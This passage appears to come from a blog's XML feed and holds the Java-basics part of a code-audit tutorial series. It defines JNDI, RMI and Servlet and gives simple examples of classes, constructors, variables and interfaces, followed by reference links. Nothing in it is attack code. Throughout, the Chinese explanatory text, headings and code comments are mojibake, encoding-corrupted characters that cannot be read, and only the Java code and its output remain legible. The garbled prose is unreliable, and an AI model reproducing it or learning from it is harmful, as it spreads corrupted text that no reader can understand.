çš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºç•Œé¢ï¼Œæä¾›äº†ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä½¿å¼€å‘è€…åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚</li><li>RMIï¼šè¿œç¨‹è°ƒç”¨æ–¹æ³•ï¼Œä¸º Java çš„ä¸€ç»„æ‹¥æŠ¤å¼€å‘åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„ APIï¼Œå¢å¼ºäº†Java å¼€å‘åˆ†å¸ƒå¼åº”ç”¨çš„èƒ½åŠ›ã€‚</li><li>Servletï¼šJava Web å®¹å™¨ä¸­è¿è¡Œçš„ç¨‹åºï¼Œé€šå¸¸ç”¨æ¥å¤„ç†è¾ƒä¸ºå¤æ‚çš„æœåŠ¡ç«¯ä¸šåŠ¡é€»è¾‘ã€‚ä½¿ç”¨ Java ç¼–å†™è€Œæˆçš„æœåŠ¡å™¨ç¨‹åºï¼Œç‹­ä¹‰çš„ Servlet ä¸º Java è¯­è¨€å®ç°çš„ä¸€ä¸ªæ¥å£ï¼Œå¹¿ä¹‰çš„è¯´å°±æ˜¯ä»»ä½•å®ç°è¯¥ Servlet æ¥å£çš„ç±»ï¼Œä¸»è¦åŠŸèƒ½åœ¨äºäº¤äº’å¼åœ°æµè§ˆå’Œä¿®æ”¹æ•°æ®ï¼Œç”ŸæˆåŠ¨æ€çš„ web å†…å®¹ã€‚</li></ul><br/><h3 id="å…«ã€Java-åŸºç¡€è¯­æ³•"><a href="#å…«ã€Java-åŸºç¡€è¯­æ³•" class="headerlink" title="å…«ã€Java åŸºç¡€è¯­æ³•"></a>å…«ã€Java åŸºç¡€è¯­æ³•</h3><h4 id="1ã€å‰è¨€"><a href="#1ã€å‰è¨€" class="headerlink" title="1ã€å‰è¨€"></a>1ã€å‰è¨€</h4><p>Java æ˜¯ä¸€ä¸ªè§£é‡Šå‹çš„è¯­è¨€ï¼Œå¯è·¨å¹³å°æ‰§è¡Œã€‚ä¸€ä¸ª Java ç¨‹åºå¯ä»¥è®¤ä¸ºæ˜¯ä¸€ç³»åˆ—å¯¹è±¡çš„é›†åˆï¼Œè¿™äº›å¯¹è±¡é€šè¿‡è°ƒç”¨å½¼æ­¤çš„æ–¹æ³•æ¥ååŒå·¥ä½œï¼Œæ¯ä¸ª Java æ–‡ä»¶éƒ½æ˜¯ä¸€ä¸ªç±»ï¼ŒåŒä¸€æ–‡ä»¶å¤¹ä¸‹å¯ä»¥äº’ç›¸è°ƒç”¨å…¶ä»–æ–‡ä»¶ä¸‹çš„ç±»ï¼Œä¸åŒæ–‡ä»¶å¤¹ä¸‹å¯ä»¥é€šè¿‡ import å‘½ä»¤è¿›è¡Œå¯¼å…¥ã€‚å…¶ä¸­ Java ä¸­çš„åŒ…å…¶å®å°±æ˜¯æ–‡ä»¶å¤¹ï¼Œåœ¨åŒä¸€ä¸ªåŒ…ä¸­å¯ä»¥ç†è§£æˆåŒä¸€æ–‡ä»¶å¤¹ä¸‹ã€‚</p><h4 id="2ã€è¯­æ³•æ³¨æ„ç‚¹"><a href="#2ã€è¯­æ³•æ³¨æ„ç‚¹" class="headerlink" title="2ã€è¯­æ³•æ³¨æ„ç‚¹"></a>2ã€è¯­æ³•æ³¨æ„ç‚¹</h4><table><thead><tr><th>æ³¨æ„ç‚¹</th><th>ç®€è¿°</th></tr></thead><tbody><tr><td>å¤§å°å†™æ•æ„Ÿ</td><td>Java æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œè¿™å°±æ„å‘³ç€æ ‡è¯†ç¬¦ Hello ä¸ hello æ˜¯ä¸åŒçš„</td></tr><tr><td>ç±»å</td><td>å¯¹äºæ‰€æœ‰çš„ç±»æ¥è¯´ï¼Œç±»åçš„é¦–å­—æ¯åº”è¯¥å¤§å†™ã€‚å¦‚æœç±»åç”±è‹¥å¹²å•è¯ç»„æˆï¼Œé‚£ä¹ˆæ¯ä¸ªå•è¯çš„é¦–å­—æ¯åº”è¯¥å¤§å†™ï¼Œä¾‹å¦‚ <strong>MyFirstJavaClass</strong></td></tr><tr><td>æ–¹æ³•å</td><td>æ‰€æœ‰çš„æ–¹æ³•åéƒ½åº”è¯¥ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚å¦‚æœæ–¹æ³•åå«æœ‰è‹¥å¹²å•è¯ï¼Œåˆ™åé¢çš„æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™</td></tr><tr><td>æºæ–‡ä»¶å</td><td>æºæ–‡ä»¶åå¿…é¡»å’Œç±»åç›¸åŒã€‚å½“ä¿å­˜æ–‡ä»¶çš„æ—¶å€™ï¼Œä½ åº”è¯¥ä½¿ç”¨ç±»åä½œä¸ºæ–‡ä»¶åä¿å­˜ï¼ˆåˆ‡è®° Java æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼‰ï¼Œæ–‡ä»¶åçš„åç¼€ä¸º <strong>.java</strong>ã€‚ï¼ˆå¦‚æœæ–‡ä»¶åå’Œç±»åä¸ç›¸åŒåˆ™ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ï¼‰</td></tr><tr><td>ä¸»æ–¹æ³•å…¥å£</td><td>æ‰€æœ‰çš„ Java ç¨‹åºç”± <strong>public static void main(String[] args)</strong> æ–¹æ³•å¼€å§‹æ‰§è¡Œ</td></tr></tbody></table><br/><h4 id="3ã€ç®€å•å®ä¾‹"><a href="#3ã€ç®€å•å®ä¾‹" class="headerlink" title="3ã€ç®€å•å®ä¾‹"></a>3ã€ç®€å•å®ä¾‹</h4><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="comment">/* ç¬¬ä¸€ä¸ªJavaç¨‹åº</span></span><br><span class="line"><span class="comment">     * å®ƒå°†è¾“å‡ºå­—ç¬¦ä¸² Hello World</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>); <span class="comment">// è¾“å‡º Hello World</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/base/662E827A-FA32-4464-B0BD-40087F429E98.jpg" data-caption="image-20220924211209757"><img src="/../images/Java/base/662E827A-FA32-4464-B0BD-40087F429E98.jpg" alt="image-20220924211209757"></a></p><br/><h4 id="4ã€æ„é€ å‡½æ•°"><a href="#4ã€æ„é€ å‡½æ•°" class="headerlink" title="4ã€æ„é€ å‡½æ•°"></a>4ã€æ„é€ å‡½æ•°</h4><p>ä¸€ä¸ªç±»å¯ä»¥åŒ…å«ä»¥ä¸‹ç±»å‹å˜é‡ï¼š</p><ul><li><strong>å±€éƒ¨å˜é‡</strong>ï¼šåœ¨æ–¹æ³•ã€æ„é€ æ–¹æ³•æˆ–è€…è¯­å¥å—ä¸­å®šä¹‰çš„å˜é‡è¢«ç§°ä¸ºå±€éƒ¨å˜é‡ã€‚å˜é‡å£°æ˜å’Œåˆå§‹åŒ–éƒ½æ˜¯åœ¨æ–¹æ³•ä¸­ï¼Œæ–¹æ³•ç»“æŸåï¼Œå˜é‡å°±ä¼šè‡ªåŠ¨é”€æ¯ã€‚</li><li><strong>æˆå‘˜å˜é‡</strong>ï¼šæˆå‘˜å˜é‡æ˜¯å®šä¹‰åœ¨ç±»ä¸­ï¼Œæ–¹æ³•ä½“ä¹‹å¤–çš„å˜é‡ã€‚è¿™ç§å˜é‡åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™å®ä¾‹åŒ–ã€‚æˆå‘˜å˜é‡å¯ä»¥è¢«ç±»ä¸­æ–¹æ³•ã€æ„é€ æ–¹æ³•å’Œç‰¹å®šç±»çš„è¯­å¥å—è®¿é—®ã€‚</li><li><strong>ç±»å˜é‡</strong>ï¼šç±»å˜é‡ä¹Ÿå£°æ˜åœ¨ç±»ä¸­ï¼Œæ–¹æ³•ä½“ä¹‹å¤–ï¼Œä½†å¿…é¡»å£°æ˜ä¸º static ç±»å‹ã€‚</li></ul><p>ä¸€ä¸ªç±»å¯ä»¥æœ‰å¤šä¸ªæ„é€ å‡½æ•°ï¼Œæ ¹æ®å¯¹è±¡çš„åˆ›å»ºæƒ…å†µè§¦å‘ä¸åŒçš„æ„é€ å‡½æ•°ï¼Œè‹¥åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™ä¼ å…¥äº†å‚æ•°ï¼Œåˆ™ä¼šè§¦å‘ç¬¬äºŒä¸ªæ„é€ å‡½æ•°ï¼Œå¦‚æœä¸ä¼ å…¥å‚æ•°åˆ™ä¼šè§¦å‘ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œä¾‹å­å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;cody&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Other class named test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">demo1</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The first Construct def.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">demo1</span><span class="params">(String a)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The second Construct def,string is &quot;</span>+a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">demo1</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo1</span>(<span class="string">&quot;SFL&quot;</span>);</span><br><span class="line">        <span class="type">demo1</span> <span class="variable">test2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">demo1</span>();</span><br><span class="line">        <span class="type">test</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">        System.out.println(te.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/base/image-20221009145926209.png" data-caption="image-20221009145926209"><img src="/../images/Java/base/image-20221009145926209.png" alt="image-20221009145926209"></a></p><br/><h4 id="5ã€ç±»ä¸å¯¹è±¡"><a href="#5ã€ç±»ä¸å¯¹è±¡" class="headerlink" title="5ã€ç±»ä¸å¯¹è±¡"></a>5ã€ç±»ä¸å¯¹è±¡</h4><p>å‡è®¾æœ‰ä¸€ä¸ªç±»åä¸ºTestï¼Œåˆ›å»ºå¯¹è±¡abcï¼Œè¯­æ³•å¦‚ä¸‹</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç±»åç§° å¯¹è±¡å = new ç±»åç§°();</span></span><br><span class="line"><span class="type">test</span> <span class="variable">abc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>();</span><br></pre></td></tr></table></figure></div><p>ç±»ï¼šç±»æ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œå®ƒæè¿°ä¸€ç±»å¯¹è±¡çš„è¡Œä¸ºå’ŒçŠ¶æ€ã€‚ä¾‹å­å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    String breed;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    String colour;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">name</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å¯¹è±¡ï¼šå¯¹è±¡æ˜¯ç±»çš„ä¸€ä¸ªå®ä¾‹ã€‚ä¾‹å­å¦‚ä¸‹:</p><ul><li><strong>å£°æ˜</strong>ï¼šå£°æ˜ä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…æ‹¬å¯¹è±¡åç§°å’Œå¯¹è±¡ç±»å‹ã€‚</li><li><strong>å®ä¾‹åŒ–</strong>ï¼šä½¿ç”¨å…³é”®å­— new æ¥åˆ›å»ºä¸€ä¸ªå¯¹è±¡ã€‚</li><li><strong>åˆå§‹åŒ–</strong>ï¼šä½¿ç”¨ new åˆ›å»ºå¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨æ„é€ æ–¹æ³•åˆå§‹åŒ–å¯¹è±¡ã€‚</li></ul><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Puppy</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Puppy</span><span class="params">(String name)</span>&#123;</span><br><span class="line">      <span class="comment">//è¿™ä¸ªæ„é€ å™¨ä»…æœ‰ä¸€ä¸ªå‚æ•°ï¼šname</span></span><br><span class="line">      System.out.println(<span class="string">&quot;å°ç‹—çš„åå­—æ˜¯ : &quot;</span> + name ); </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      <span class="comment">// ä¸‹é¢çš„è¯­å¥å°†åˆ›å»ºä¸€ä¸ªPuppyå¯¹è±¡</span></span><br><span class="line">      <span class="type">Puppy</span> <span class="variable">myPuppy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Puppy</span>( <span class="string">&quot;tommy&quot;</span> );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><h4 id="6ã€å˜é‡ä¸å¸¸é‡"><a href="#6ã€å˜é‡ä¸å¸¸é‡" class="headerlink" title="6ã€å˜é‡ä¸å¸¸é‡"></a>6ã€å˜é‡ä¸å¸¸é‡</h4><p>ä¾‹å­å¦‚ä¸‹ï¼Œaä¸ºå˜é‡ï¼Œbåœ¨charå‰åŠ äº† final ä¸ºå¸¸é‡ï¼Œå¸¸é‡æ— æ³•è¢«æ›´æ”¹ã€‚</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char a = &#x27;a&#x27;;</span><br><span class="line">final char b = &#x27;b&#x27;;</span><br></pre></td></tr></table></figure></div><br/><h4 id="7ã€è®¿é—®å®ä¾‹å˜é‡å’Œæ–¹æ³•"><a href="#7ã€è®¿é—®å®ä¾‹å˜é‡å’Œæ–¹æ³•" class="headerlink" title="7ã€è®¿é—®å®ä¾‹å˜é‡å’Œæ–¹æ³•"></a>7ã€è®¿é—®å®ä¾‹å˜é‡å’Œæ–¹æ³•</h4><p>é€šè¿‡å·²åˆ›å»ºçš„å¯¹è±¡æ¥è®¿é—®æˆå‘˜å˜é‡å’Œæˆå‘˜æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å®ä¾‹åŒ–å¯¹è±¡ï¼šObject referenceVariable = new Constructor();</span><br><span class="line">è®¿é—®ç±»ä¸­çš„å˜é‡ï¼šreferenceVariable.variableName;</span><br><span class="line">è®¿é—®ç±»ä¸­çš„æ–¹æ³•ï¼šreferenceVariable.methodName();</span><br></pre></td></tr></table></figure></div><p>å®ä¾‹,ä¸‹é¢çš„ä¾‹å­å±•ç¤ºå¦‚ä½•è®¿é—®å®ä¾‹å˜é‡å’Œè°ƒç”¨æˆå‘˜æ–¹æ³•ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Puppy</span>&#123;</span><br><span class="line">   <span class="type">int</span> puppyAge;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Puppy</span><span class="params">(String name)</span>&#123;</span><br><span class="line">      <span class="comment">// è¿™ä¸ªæ„é€ å™¨ä»…æœ‰ä¸€ä¸ªå‚æ•°ï¼šname</span></span><br><span class="line">      System.out.println(<span class="string">&quot;å°ç‹—çš„åå­—æ˜¯ : &quot;</span> + name ); </span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">( <span class="type">int</span> age )</span>&#123;</span><br><span class="line">       puppyAge = age;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">( )</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;å°ç‹—çš„å¹´é¾„ä¸º : &quot;</span> + puppyAge ); </span><br><span class="line">       <span class="keyword">return</span> puppyAge;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      <span class="comment">/* åˆ›å»ºå¯¹è±¡ä¸ºmyPuppy */</span></span><br><span class="line">      <span class="type">Puppy</span> <span class="variable">myPuppy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Puppy</span>( <span class="string">&quot;tommy&quot;</span> );</span><br><span class="line">      <span class="comment">/* åˆ©ç”¨åˆ›å»ºçš„å¯¹è±¡ï¼Œé€šè¿‡æ–¹æ³•æ¥è®¾å®šage */</span></span><br><span class="line">      myPuppy.setAge( <span class="number">2</span> );</span><br><span class="line">      <span class="comment">/* è°ƒç”¨å¦ä¸€ä¸ªæ–¹æ³•è·å–age */</span></span><br><span class="line">      myPuppy.getAge( );</span><br><span class="line">      <span class="comment">/*ä½ ä¹Ÿå¯ä»¥åƒä¸‹é¢è¿™æ ·è®¿é—®æˆå‘˜å˜é‡ */</span></span><br><span class="line">      System.out.println(<span class="string">&quot;å˜é‡å€¼ : &quot;</span> + myPuppy.puppyAge ); </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><a data-fancybox="gallery" data-src="/../images/Java/base/image-20221009150647117.png" data-caption="image-20221009150647117"><img src="/../images/Java/base/image-20221009150647117.png" alt="image-20221009150647117"></a></p><br/><h4 id="8ã€æ¥å£"><a href="#8ã€æ¥å£" class="headerlink" title="8ã€æ¥å£"></a>8ã€æ¥å£</h4><p>æ¥å£ï¼ˆè‹±æ–‡ï¼šInterfaceï¼‰ï¼Œåœ¨JAVAç¼–ç¨‹è¯­è¨€ä¸­æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»å‹ï¼Œæ˜¯æŠ½è±¡æ–¹æ³•çš„é›†åˆï¼Œæ¥å£é€šå¸¸ä»¥interfaceæ¥å£°æ˜ã€‚ä¸€ä¸ªç±»é€šè¿‡ç»§æ‰¿æ¥å£çš„æ–¹å¼ï¼Œä»è€Œæ¥ç»§æ‰¿æ¥å£çš„æŠ½è±¡æ–¹æ³•ã€‚</p><p>æ¥å£çš„å£°æ˜è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[å¯è§åº¦] interface æ¥å£åç§° [extends å…¶ä»–çš„æ¥å£å] &#123;</span><br><span class="line">        <span class="comment">// å£°æ˜å˜é‡</span></span><br><span class="line">        <span class="comment">// æŠ½è±¡æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Interfaceå…³é”®å­—ç”¨æ¥å£°æ˜ä¸€ä¸ªæ¥å£ã€‚ä¸‹é¢æ˜¯æ¥å£å£°æ˜çš„ä¸€ä¸ªç®€å•ä¾‹å­ã€‚</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* æ–‡ä»¶å : NameOfInterface.java */</span></span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="comment">//å¼•å…¥åŒ…</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">NameOfInterface</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">//ä»»ä½•ç±»å‹ final, static å­—æ®µ</span></span><br><span class="line">   <span class="comment">//æŠ½è±¡æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>å®ä¾‹,Animal.java æ–‡ä»¶ä»£ç ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* æ–‡ä»¶å : Animal.java */</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ¥å£çš„å®ç°,å½“ç±»å®ç°æ¥å£çš„æ—¶å€™ï¼Œç±»è¦å®ç°æ¥å£ä¸­æ‰€æœ‰çš„æ–¹æ³•ã€‚å¦åˆ™ï¼Œç±»å¿…é¡»å£°æ˜ä¸ºæŠ½è±¡çš„ç±»ã€‚ç±»ä½¿ç”¨implementså…³é”®å­—å®ç°æ¥å£ã€‚åœ¨ç±»å£°æ˜ä¸­ï¼ŒImplementså…³é”®å­—æ”¾åœ¨classå£°æ˜åé¢ã€‚å®ä¾‹</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* æ–‡ä»¶å : MammalInt.java */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MammalInt</span> <span class="keyword">implements</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mammal eats&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">travel</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Mammal travels&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">noOfLegs</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">      <span class="type">MammalInt</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MammalInt</span>();</span><br><span class="line">      m.eat();</span><br><span class="line">      m.travel();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä»¥ä¸Šå®ä¾‹ç¼–è¯‘è¿è¡Œç»“æœå¦‚ä¸‹:</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Mammal eats</span><br><span class="line">Mammal travels</span><br></pre></td></tr></table></figure></div><br/><h3 id="ä¹ã€å‚è€ƒæ–‡ç« "><a href="#ä¹ã€å‚è€ƒæ–‡ç« " class="headerlink" title="ä¹ã€å‚è€ƒæ–‡ç« "></a>ä¹ã€å‚è€ƒæ–‡ç« </h3><p><code>https://blog.csdn.net/chehec2010/article/details/123997607</code><br><code>https://blog.csdn.net/jianyuerensheng/article/details/51258942</code><br><code>https://www.freebuf.com/vuls/344685.html</code><br><code>https://www.cnpanda.net/codeaudit/705.html</code><br><code>https://blog.csdn.net/qq_41874930/article/details/115614958</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Javaä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaä»£ç å®¡è®¡(äºŒ)-è¿œç¨‹ä»£ç æ‰§è¡Œ</title>
